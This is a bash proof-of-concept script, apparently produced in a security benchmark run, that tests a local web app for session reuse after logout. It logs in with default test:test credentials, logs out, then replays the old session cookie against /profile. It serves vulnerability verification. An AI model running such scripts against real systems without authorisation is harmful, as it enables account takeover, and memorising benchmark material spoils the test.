#!/bin/bash
# POC: Demonstrates session reuse after logout - session not invalidated server-side allowing attacker to access protected resources with old session token after user logs out
# Target: ./repo
# Created: 2025-12-02T16:28:40.244Z
# Session: benchmark-XBEN-104-24-mioryccy

# Session Reuse After Logout - POC v2
# This script demonstrates that sessions are not invalidated server-side after logout
# allowing an attacker to continue using the old session token to access protected resources

TARGET_URL="${1:-http://localhost:8080}"

echo "[*] Session Reuse After Logout - POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login to get a valid session
echo "[+] Step 1: Logging in with default credentials (test:test)..."
LOGIN_RESPONSE=$(curl -s -i "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

# Extract session cookie from Set-Cookie header
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "set-cookie.*session=" | head -1 | sed -n 's/.*session=\([^;]*\).*/\1/p')

if [ -z "$SESSION_COOKIE" ]; then
  echo "[-] Failed to extract session cookie. Login may have failed."
  echo "[*] Response:"
  echo "$LOGIN_RESPONSE" | head -20
  exit 1
fi

echo "[+] Session obtained: $SESSION_COOKIE"
echo ""

# Step 2: Verify session works - access protected resource
echo "[+] Step 2: Verifying session is valid - accessing /profile..."
PROFILE_BEFORE=$(curl -s -i -b "session=$SESSION_COOKIE" "$TARGET_URL/profile")
HTTP_CODE_BEFORE=$(echo "$PROFILE_BEFORE" | head -1 | grep -oP '\d{3}')
PROFILE_BODY_BEFORE=$(echo "$PROFILE_BEFORE" | tail -n +5)

if [ "$HTTP_CODE_BEFORE" = "200" ]; then
  echo "[+] Session is valid - HTTP 200 received"
  if echo "$PROFILE_BODY_BEFORE" | grep -q "user_id"; then
    echo "[+] Protected user data accessible: user_id found in response"
  fi
else
  echo "[-] Unexpected response code: $HTTP_CODE_BEFORE"
  echo "[*] Response:"
  echo "$PROFILE_BEFORE"
  exit 1
fi
echo ""

# Step 3: Logout
echo "[+] Step 3: Calling logout endpoint..."
LOGOUT_RESPONSE=$(curl -s -i -b "session=$SESSION_COOKIE" "$TARGET_URL/logout")
echo "$LOGOUT_RESPONSE" | head -n 12
echo ""

# Check for Max-Age=0 in logout response
if echo "$LOGOUT_RESPONSE" | grep -qi "Max-Age=0"; then
  echo "[+] Logout returned Set-Cookie with Max-Age=0 (attempting to clear client cookie)"
else
  echo "[!] No clear cookie directive found in logout response"
fi
echo ""

# Step 4: Attempt to reuse the old session after logout
echo "[+] Step 4: Attempting to reuse old session token after logout..."
echo "[!] Using same session token: $SESSION_COOKIE"
PROFILE_AFTER=$(curl -s -i -b "session=$SESSION_COOKIE" "$TARGET_URL/profile")
HTTP_CODE_AFTER=$(echo "$PROFILE_AFTER" | head -1 | grep -oP '\d{3}')
PROFILE_BODY_AFTER=$(echo "$PROFILE_AFTER" | tail -n +5)

echo ""
echo "[*] VULNERABILITY TEST RESULTS:"
echo "================================"
echo "HTTP Status Code After Logout: $HTTP_CODE_AFTER"

if [ "$HTTP_CODE_AFTER" = "200" ]; then
  echo "[!] CRITICAL: HTTP 200 returned - Session still valid!"
  if echo "$PROFILE_BODY_AFTER" | grep -q "user_id"; then
    echo "[!] CRITICAL: Protected user data still accessible after logout!"
    echo ""
    echo "[+] VULNERABILITY CONFIRMED: Session was not invalidated server-side"
    echo "[+] An attacker can continue using the old session token after logout"
    echo ""
    echo "[*] Response sample:"
    echo "$PROFILE_BODY_AFTER" | head -c 300
    echo ""
    exit 0
  fi
elif [ "$HTTP_CODE_AFTER" = "302" ] || [ "$HTTP_CODE_AFTER" = "401" ] || [ "$HTTP_CODE_AFTER" = "403" ]; then
  echo "[-] HTTP $HTTP_CODE_AFTER returned - Session properly invalidated"
  echo "[-] VULNERABILITY NOT CONFIRMED"
  exit 1
else
  echo "[?] Unexpected response code: $HTTP_CODE_AFTER"
  exit 1
fi